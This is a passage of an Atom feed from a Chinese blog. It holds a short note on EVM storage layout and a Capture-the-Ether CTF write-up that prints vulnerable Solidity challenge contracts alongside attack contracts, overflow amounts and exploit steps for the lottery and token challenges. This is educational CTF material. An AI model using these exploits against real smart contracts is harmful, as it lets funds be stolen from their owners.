<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>LexLady</title>
  
  
  <link href="http://lexlady.top/atom.xml" rel="self"/>
  
  <link href="http://lexlady.top/"/>
  <updated>2023-04-11T09:25:58.473Z</updated>
  <id>http://lexlady.top/</id>
  
  <author>
    <name>Lexlady</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>web3.js</title>
    <link href="http://lexlady.top/2023/04/11/web3-js/"/>
    <id>http://lexlady.top/2023/04/11/web3-js/</id>
    <published>2023-04-11T09:25:58.000Z</published>
    <updated>2023-04-11T09:25:58.473Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>temp</title>
    <link href="http://lexlady.top/2023/04/08/temp/"/>
    <id>http://lexlady.top/2023/04/08/temp/</id>
    <published>2023-04-08T09:27:22.000Z</published>
    <updated>2023-04-08T09:38:42.648Z</updated>
    
    <content type="html"><![CDATA[<h1 id="以太坊的数据存储"><a href="#以太坊的数据存储" class="headerlink" title="以太坊的数据存储"></a>以太坊的数据存储</h1><p>对于固定大小的变量EVM会直接将他们按顺序从0开始存储在每个存储位中，每个存储位都是32字节（256bit），是一种键值对的形式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity^0.8.10;<br><br>contract test&#123;<br>    uint256 public a=9;<br>    uint256[2] public b;<br>    address c;<br>    function t() public &#123;<br>        b[0] = 63;<br>        b[1] =96;<br>        c = msg.sender;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/08/temp/storage_structure_11.png"><br>这里就可以看到对于32字节固定长度的数据每个都占据一个key，key&#x3D;1对应变量a的存储位。key&#x3D;1，2对应变量b的两个存储位。相应的value便是变量的值。<br>因为在EVM中存储数据是需要消耗gas的，不论是永久的storage还是内存的memory只是消耗的gas量不同（storage比memory更昂贵），所以solidity里进行了一定的存储优化，简单来讲，即定义的这个变量所占的空间小于32个字节时，它所占据的这个存储位的空间可以与它后面的变量共享（当然前提是这个变量塞的下去）因为在EVM里将数据写入一个新位置和写入一个已经分配出来的位置所需的gas是不一样的。</p><p><code>uint16 public d=12;  uint16 public g=8;  bytes16 public name=&quot;lex&quot;;</code><br><img src="/2023/04/08/temp/storage_structure_12.png"><br>可以看到上面三个变量占用了同一个存储位key&#x3D;0，但占 用着空间的不同位置。实现了存储的共享<br>对于动态数据的存储，有着自己的计算规则：<code>keccak256(bytes32(key)+bytes32(position))</code>此处的key为映射的key，position则是定义变量的位置。根据此式我们可以算出变量存储位置</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;以太坊的数据存储&quot;&gt;&lt;a href=&quot;#以太坊的数据存储&quot; class=&quot;headerlink&quot; title=&quot;以太坊的数据存储&quot;&gt;&lt;/a&gt;以太坊的数据存储&lt;/h1&gt;&lt;p&gt;对于固定大小的变量EVM会直接将他们按顺序从0开始存储在每个存储位中，每个存储位都是32字节</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Capture-the-Ether</title>
    <link href="http://lexlady.top/2023/04/01/Capture-the-Ether/"/>
    <id>http://lexlady.top/2023/04/01/Capture-the-Ether/</id>
    <published>2023-04-01T13:48:19.000Z</published>
    <updated>2023-05-23T06:12:10.369Z</updated>
    
    <content type="html"><![CDATA[<p>由于Ropsten测试网络在2022.10.5日起已被正式弃用；因此该网页上的在线编写功能无法正常运行；所有实现均在remix上复现，收录在本系列之中，希望对各位看官有所帮助<br><del>(TvT)</del> <del>(TvT)</del> <del>(TvT)</del> <del>(TvT)</del> <del>(TvT)</del></p><span id="more"></span><h1 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h1><h2 id="Guess-Number"><a href="#Guess-Number" class="headerlink" title="Guess Number"></a>Guess Number</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheNumberChallenge &#123;<br>    uint8 answer = 42;<br><br>    function GuessTheNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目直接给出了答案，直接填<br><img src="/2023/04/01/Capture-the-Ether/GuessNumber_1.png"><img src="/2023/04/01/Capture-the-Ether/GuessNumber_2.png"><br>对于一个普通的数字，通过枚举它总是可以被猜中的，同时当有人知道了答案时，他就能直接获取奖励，很显然这对于其他不知道答案的人是极其不公平的；因此，我们对其进行处理改进：</p><h2 id="The-Secret-Number"><a href="#The-Secret-Number" class="headerlink" title="The Secret Number"></a>The Secret Number</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheSecretNumberChallenge &#123;<br>    ---不同点---<br>    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;<br><br>    function GuessTheSecretNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br>    <br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (keccak256(n) == answerHash) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于结果是一个uint8的hash值所以我们只能够进行暴力枚举。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">contract attack&#123;<br>    function sol() public returns (uint8)&#123;<br>        for(uint8 i=0;i&lt;255;i++)&#123;<br>            if(keccak256(i)==<br>            0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365)<br>            &#123;retuen i;&#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实现：<br><img src="/2023/04/01/Capture-the-Ether/SecNumber_1.png"><br><img src="/2023/04/01/Capture-the-Ether/SecNumber_2.png"><br>这样的操作也只是避免了直接获取结果得出答案的情况——哈希算法是不可逆的加密算法，一定程度上提高了安全性，但仍然可以暴力枚举破解。</p><h2 id="The-Randon-Number"><a href="#The-Randon-Number" class="headerlink" title="The Randon Number"></a>The Randon Number</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheRandomNumberChallenge &#123;<br>    uint8 answer;<br><br>    function GuessTheRandomNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>        ---不同点---<br>        answer = uint8(keccak256(block.blockhash(block.number - 1), now));<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这次的结果是根据当前的区块数和时间来制定的，他是随机的，这样就大大的增强了安全强度，避免了反复使用一个结果。<br>通过web3查询部署该合约时当前的区块高度和时间来得到answer，再进行输入即可。<br>先获取合约所在块的高度或者区块哈希<br><code>web3.eth.getTransaction(transactionHash).BlockNumber\BlockHash</code><br>再通过区块高度或区块哈希找当前区块的timestamp<br><code>web3.eth.getBlock(BlockNumber).timestamp</code><br>可以从返回值中看到</p><blockquote><p>另外，由于answer是存储在合约中的（storage）因此，只要我们理解了他是如何存储的我们也能够通过<code>ethers.js</code>中的<code>getStorageAt</code>方法来获取answer的值</p></blockquote><h2 id="The-New-Number"><a href="#The-New-Number" class="headerlink" title="The New Number"></a>The New Number</h2><p>在上一个的合约代码中我们可以看到answer是在合约部署时就已经赋值了，而这次我们将其放在方法中，只有在有用户使用这个方法时才对answer进行赋值操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheNewNumberChallenge &#123;<br>    function GuessTheNewNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br>        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于block.number状态变量允许获取当前块的高度。但是，在EVM中执行事务的那一刻，由于显而易见的原因，尚未知道正在创建的块的blockhash，所以我们无法通过web3进行查询，但是在我们调用这一合约时，是在同一个区块进行的，也就是说通过攻击合约进行模拟挑战中的所有操作然后调用<code>guess</code>方法，而不需要通过在链下进行计算再提交答案并保证交易在下一区块立即被挖矿的情形。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">contract attack&#123;<br>    GuessTheNewNumberChallenge gus;<br>    function attack(address _add) public&#123;<br>        gue = GuessTheNewNumberChallenge(_add);<br>    &#125;<br>    function att()public payable&#123;<br>        uint8 val = uint8(keccak256(block.blockhash(block.number - 1), now));<br>        gue.guess.value(1 ether)(val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PredictTheFutureChallenge &#123;<br>    address guesser;<br>    uint8 guess;<br>    uint256 settlementBlockNumber;<br><br>    function PredictTheFutureChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function lockInGuess(uint8 n) public payable &#123;<br>        require(guesser == 0);<br>        require(msg.value == 1 ether);<br><br>        guesser = msg.sender;<br>        guess = n;<br>        settlementBlockNumber = block.number + 1;<br>    &#125;<br><br>    function settle() public &#123;<br>        require(msg.sender == guesser);<br>        require(block.number &gt; settlementBlockNumber);<br><br>        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;<br><br>        guesser = 0;<br>        if (guess == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先下注，后开奖。由于不能预测未来区块的内容，所以对于answer我们无法准确掌握，但是这里的answer是一个0~9的数，因此我们可以设定一个值等待answer自己撞上来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attack&#123;<br>    PredictTheFutureChallenge pre;<br>    uint8 public answer=2;      <br>    function attack(address _add)public&#123;<br>        pre = PredictTheFutureChallenge(_add);<br>    &#125;<br>    function lock()public payable &#123;<br>        pre.lockInGuess.value(1 ether)(answer);<br>    &#125;<br>    function sol() public &#123;<br>        uint8 temp = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;<br>        if(temp == answer)&#123;<br>            pre.settle();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PredictTheBlockHashChallenge &#123;<br>    address guesser;<br>    bytes32 guess;<br>    uint256 settlementBlockNumber;<br><br>    function PredictTheBlockHashChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function lockInGuess(bytes32 hash) public payable &#123;<br>        require(guesser == 0);<br>        require(msg.value == 1 ether);<br><br>        guesser = msg.sender;<br>        guess = hash;<br>        settlementBlockNumber = block.number + 1;<br>    &#125;<br><br>    function settle() public &#123;<br>        require(msg.sender == guesser);<br>        require(block.number &gt; settlementBlockNumber);<br><br>        bytes32 answer = block.blockhash(settlementBlockNumber);<br><br>        guesser = 0;<br>        if (guess == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样是预测未来区块的内容，显然这根本是不可能的。但是在EVM中block.blockhash保存的最大数目是最近的256个区块，也即是说当超出最新区块256个区块之后的block.blockhash将被置为0。<br>因此我们同样只需要等。（10s一个块，256*10&#x2F;60 过个一小时吧（笑）</p><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h2><p>要求：转走合约中的余额</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenSaleChallenge &#123;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    uint256 constant PRICE_PER_TOKEN = 1 ether;<br><br>    function TokenSaleChallenge(address _player) public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance &lt; 1 ether;<br>    &#125;<br><br>    function buy(uint256 numTokens) public payable &#123;<br>        require(msg.value == numTokens * PRICE_PER_TOKEN);<br><br>        balanceOf[msg.sender] += numTokens;<br>    &#125;<br><br>    function sell(uint256 numTokens) public &#123;<br>        require(balanceOf[msg.sender] &gt;= numTokens);<br><br>        balanceOf[msg.sender] -= numTokens;<br>        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：因为合约的货币只有两个方法<code>sell()</code>、<code>buy()</code>，所以我们只有卖出比我们所购买的更多的货币才能达成<code>address(this).balance &lt; 1 ether</code>的条件。<br>在买入时有这么一个检查：<code>require(msg.value == numToken * PRICE_PER_TOKEN)</code>，因为<code>PRICE_PER_TOKEN</code>是一个不可修改的值，但可以通过与<code>numToken</code>的乘积进行溢出，从而绕过检查<br>uint256的最大值为2^256-1：<code>115792089237316195423570985008687907853269984665640564039457584007913129639935</code><br>，所以该值除以10^18后添个一就是造成溢出的最小值：<code>115792089237316195423570985008687907853269984665640564039457 + 1</code><br>溢出的结果为<code>415992086870360064</code><br>所以我们只需要发送415992086870360064wei，提出115792089237316195423570985008687907853269984665640564039458的购买量就能够获得大量的货币。之后，我们卖出1 ether来完成挑战</p><h2 id="Token-Whale"><a href="#Token-Whale" class="headerlink" title="Token Whale"></a>Token Whale</h2><p>要求：拥有1,000,000的余额</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenWhaleChallenge &#123;<br>    address player;<br><br>    uint256 public totalSupply;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;<br><br>    string public name = &quot;Simple ERC20 Token&quot;;<br>    string public symbol = &quot;SET&quot;;<br>    uint8 public decimals = 18;<br><br>    function TokenWhaleChallenge(address _player) public &#123;<br>        player = _player;<br>        totalSupply = 1000;<br>        balanceOf[player] = 1000;<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return balanceOf[player] &gt;= 1000000;<br>    &#125;<br><br>    event Transfer(address indexed from, address indexed to, uint256 value);<br><br>    function _transfer(address to, uint256 value) internal &#123;<br>        balanceOf[msg.sender] -= value;<br>        balanceOf[to] += value;<br><br>        emit Transfer(msg.sender, to, value);<br>    &#125;<br><br>    function transfer(address to, uint256 value) public &#123;<br>        require(balanceOf[msg.sender] &gt;= value);<br>        require(balanceOf[to] + value &gt;= balanceOf[to]);<br><br>        _transfer(to, value);<br>    &#125;<br><br>    event Approval(address indexed owner, address indexed spender, uint256 value);<br><br>    function approve(address spender, uint256 value) public &#123;<br>        allowance[msg.sender][spender] = value;<br>        emit Approval(msg.sender, spender, value);<br>    &#125;<br><br>    function transferFrom(address from, address to, uint256 value) public &#123;<br>        require(balanceOf[from] &gt;= value);<br>        require(balanceOf[to] + value &gt;= balanceOf[to]);<br>        require(allowance[from][msg.sender] &gt;= value);<br><br>        allowance[from][msg.sender] -= value;<br>        _transfer(to, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：合约是一个与ERC20标准类似的货币，没有使用SafeMath库进行检查，问题更大的是<code>transferFrom()</code>函数中调用<code>_transfer()</code>不是在<code>from</code>和<code>to</code>之间的交易而是<code>msg.sender</code>和<code>to</code>之间的交易，这就是漏洞的关键<br>我们可以利用一份代理地址，玩家可以给代理地址分配任意的<code>allowance</code>，由代理地址向玩家和另一个地址进行<code>transferFrom()</code>，这样在执行<code>_transfer()</code>的过程中，代理地址的余额将会发生溢出，获得大量的货币，最后再将代理地址的余额用<code>transfer()</code>转移给玩家就可以通过挑战了<br>大致流程<br>player：addr1<br>ToAccount：addr2<br>ProxyAccount：addr3  </p><ol><li>player.approve(addr3,1000000)        &#x2F;&#x2F;满足后续allowance[player][ProxyAccount]的条件  </li><li>ProxyAccount.transferFrom(addr1,addr2,1)        &#x2F;&#x2F;ToAccount无关紧要，交易完成后balanceOf[addr3]将会获得很多</li><li>ProxyAccount.transfer(player,1000000)        &#x2F;&#x2F;将获得的余额转入玩家地址</li></ol><h2 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h2><p>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract RetirementFundChallenge &#123;<br>    uint256 startBalance;<br>    address owner = msg.sender;<br>    address beneficiary;<br>    uint256 expiration = now + 10 years;<br><br>    function RetirementFundChallenge(address player) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        beneficiary = player;<br>        startBalance = msg.value;<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function withdraw() public &#123;<br>        require(msg.sender == owner);<br><br>        if (now &lt; expiration) &#123;<br>            // early withdrawal incurs a 10% penalty<br>            msg.sender.transfer(address(this).balance * 9 / 10);<br>        &#125; else &#123;<br>            msg.sender.transfer(address(this).balance);<br>        &#125;<br>    &#125;<br><br>    function collectPenalty() public &#123;<br>        require(msg.sender == beneficiary);<br><br>        uint256 withdrawn = startBalance - address(this).balance;<br><br>        // an early withdrawal occurred<br>        require(withdrawn &gt; 0);<br><br>        // penalty is what&#x27;s left<br>        msg.sender.transfer(address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：要能够进行transfer操作除了own本人进行withdraw后，我们才能进行。但是因为withdrawn是一个uint256的数，我们只要往合约中投入一点ether，使得withdrawn发生溢出就能够绕过要求进行提款。<br>攻击实现：我们看到在合约中并没有任何接受ether的方法，所以不能向合约直接发送ether，所以这里需要通过<strong>函数selfdestruct</strong><br>可参考Ethernaut 题8</p><h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><p>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract MappingChallenge &#123;<br>    bool public isComplete;<br>    uint256[] map;<br><br>    function set(uint256 key, uint256 value) public &#123;<br>        // Expand dynamic array as needed<br>        if (map.length &lt;= key) &#123;<br>            map.length = key + 1;<br>        &#125;<br><br>        map[key] = value;<br>    &#125;<br><br>    function get(uint256 key) public view returns (uint256) &#123;<br>        return map[key];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h2><p>要求：取走合约中的钱<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract DonationChallenge &#123;<br>    struct Donation &#123;<br>        uint256 timestamp;<br>        uint256 etherAmount;<br>    &#125;<br>    Donation[] public donations;<br><br>    address public owner;<br><br>    function DonationChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>        <br>        owner = msg.sender;<br>    &#125;<br>    <br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function donate(uint256 etherAmount) public payable &#123;<br>        // amount is in ether, but msg.value is in wei<br>        uint256 scale = 10**18 * 1 ether;<br>        require(msg.value == etherAmount / scale);<br><br>        Donation donation;<br>        donation.timestamp = now;<br>        donation.etherAmount = etherAmount;<br><br>        donations.push(donation);<br>    &#125;<br><br>   